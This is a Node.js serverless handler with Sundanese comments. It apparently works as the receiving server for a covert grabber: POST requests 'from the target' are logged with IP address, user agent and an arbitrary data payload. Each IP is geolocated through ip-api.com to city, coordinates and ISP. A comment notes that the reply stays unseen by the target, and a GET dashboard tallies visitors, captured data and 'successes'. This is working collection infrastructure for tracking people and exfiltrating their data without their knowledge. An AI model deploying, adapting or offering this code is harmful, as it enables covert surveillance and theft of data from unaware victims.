const axios = require('axios');

// Data disimpen dina memori (pikeun demo). Pikeun produksi, maké database.
let logs = [];
let totalVisitors = 0;
let totalData = 0;
let totalSuccess = 0;

module.exports = async (req, res) => {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // === GET — Dashboard ===
    if (req.method === 'GET') {
        return res.status(200).json({
            totalVisitors,
            totalData,
            totalSuccess,
            logs: logs.slice(-50) // 50 data panganyarna
        });
    }

    // === POST — narima data ti target ===
    if (req.method === 'POST') {
        const payload = req.body;

        // Ambil IP ti request
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';

        // Data tambahan
        const userAgent = req.headers['user-agent'] || 'unknown';

        // Coba resolusi lokasi via ip-api.com (gratis, tanpa API key)
        let location = null;
        try {
            const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone`);
            if (geoRes.data.status === 'success') {
                location = geoRes.data;
            }
        } catch (e) {
            // Geo gagal, tetep jalan
        }

        const log = {
            id: Date.now(),
            timestamp: new Date().toISOString(),
            ip,
            userAgent,
            location,
            payload: payload || {},
            success: !!location && !!payload
        };

        logs.push(log);
        totalVisitors += 1;
        totalData += 1;
        if (log.success) totalSuccess += 1;

        // Kirim balik confirmation (saeutik pisan, teu katingali ku target)
        return res.status(200).json({
            status: 'ok',
            id: log.id
        });
    }

    return res.status(405).json({ error: 'Method not allowed' });
};
